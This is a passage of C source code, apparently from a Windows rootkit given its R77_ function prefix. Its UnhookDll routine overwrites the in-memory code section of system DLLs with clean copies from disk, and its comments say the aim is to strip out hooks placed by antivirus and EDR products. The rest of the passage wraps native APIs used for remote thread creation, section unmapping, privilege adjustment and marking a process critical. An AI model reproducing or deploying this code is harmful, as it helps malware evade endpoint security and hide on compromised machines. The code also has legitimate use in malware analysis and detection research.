	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((LPBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);

	if (rva < sections[0].PointerToRawData)
	{
		return rva;
	}
	else
	{
		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
		{
			if (rva >= sections[i].VirtualAddress && rva < sections[i].VirtualAddress + sections[i].SizeOfRawData)
			{
				return rva - sections[i].VirtualAddress + sections[i].PointerToRawData;
			}
		}

		return 0;
	}
}
VOID UnhookDll(LPCWSTR name)
{
	if (name)
	{
		WCHAR path[MAX_PATH + 1];
		if (Is64BitOperatingSystem() && BITNESS(32)) StrCpyW(path, L"C:\\Windows\\SysWOW64\\");
		else StrCpyW(path, L"C:\\Windows\\System32\\");

		StrCatW(path, name);

		// Get original DLL handle. This DLL is possibly hooked by AV/EDR solutions.
		HMODULE dll = GetModuleHandleW(name);
		if (dll)
		{
			MODULEINFO moduleInfo;
			i_memset(&moduleInfo, 0, sizeof(MODULEINFO));

			if (GetModuleInformation(GetCurrentProcess(), dll, &moduleInfo, sizeof(MODULEINFO)))
			{
				// Retrieve a clean copy of the DLL file.
				HANDLE dllFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
				if (dllFile != INVALID_HANDLE_VALUE)
				{
					// Map the clean DLL into memory
					HANDLE dllMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
					if (dllMapping)
					{
						LPVOID dllMappedFile = MapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
						if (dllMappedFile)
						{
							PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);

							for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
							{
								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));

								// Find the .text section of the hooked DLL and overwrite it with the original DLL section
								if (!StrCmpIA((LPCSTR)sectionHeader->Name, ".text"))
								{
									LPVOID virtualAddress = (LPVOID)((ULONG_PTR)moduleInfo.lpBaseOfDll + (ULONG_PTR)sectionHeader->VirtualAddress);
									DWORD virtualSize = sectionHeader->Misc.VirtualSize;

									DWORD oldProtect;
									VirtualProtect(virtualAddress, virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
									i_memcpy(virtualAddress, (LPVOID)((ULONG_PTR)dllMappedFile + (ULONG_PTR)sectionHeader->VirtualAddress), virtualSize);
									VirtualProtect(virtualAddress, virtualSize, oldProtect, &oldProtect);

									break;
								}
							}
						}

						CloseHandle(dllMapping);
					}

					CloseHandle(dllFile);
				}
			}

			FreeLibrary(dll);
		}
	}
}

NTSTATUS NTAPI R77_NtQueryObject(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength)
{
	// NtQueryObject must be called by using GetProcAddress on Windows 7.
	return ((NT_NTQUERYOBJECT)GetFunction("ntdll.dll", "NtQueryObject"))(handle, objectInformationClass, objectInformation, objectInformationLength, returnLength);
}
NTSTATUS NTAPI R77_NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer)
{
	// Use NtCreateThreadEx instead of CreateRemoteThread.
	// CreateRemoteThread does not work across sessions in Windows 7.
	return ((NT_NTCREATETHREADEX)GetFunction("ntdll.dll", "NtCreateThreadEx"))(thread, desiredAccess, objectAttributes, processHandle, startAddress, parameter, flags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, bytesBuffer);
}
NTSTATUS NTAPI R77_NtUnmapViewOfSection(HANDLE processHandle, LPVOID baseAddress)
{
	return ((NT_NTUNMAPVIEWOFSECTION)GetFunction("ntdll.dll", "NtUnmapViewOfSection"))(processHandle, baseAddress);
}
NTSTATUS NTAPI R77_RtlGetVersion(PRTL_OSVERSIONINFOW versionInformation)
{
	return ((NT_RTLGETVERSION)GetFunction("ntdll.dll", "RtlGetVersion"))(versionInformation);
}
NTSTATUS NTAPI R77_RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue)
{
	return ((NT_RTLADJUSTPRIVILEGE)GetFunction("ntdll.dll", "RtlAdjustPrivilege"))(privilege, enablePrivilege, isThreadPrivilege, previousValue);
}
NTSTATUS NTAPI R77_RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb)
{
	return ((NT_RTLSETPROCESSISCRITICAL)GetFunction("ntdll.dll", "RtlSetProcessIsCritical"))(newIsCritical, oldIsCritical, needScb);
}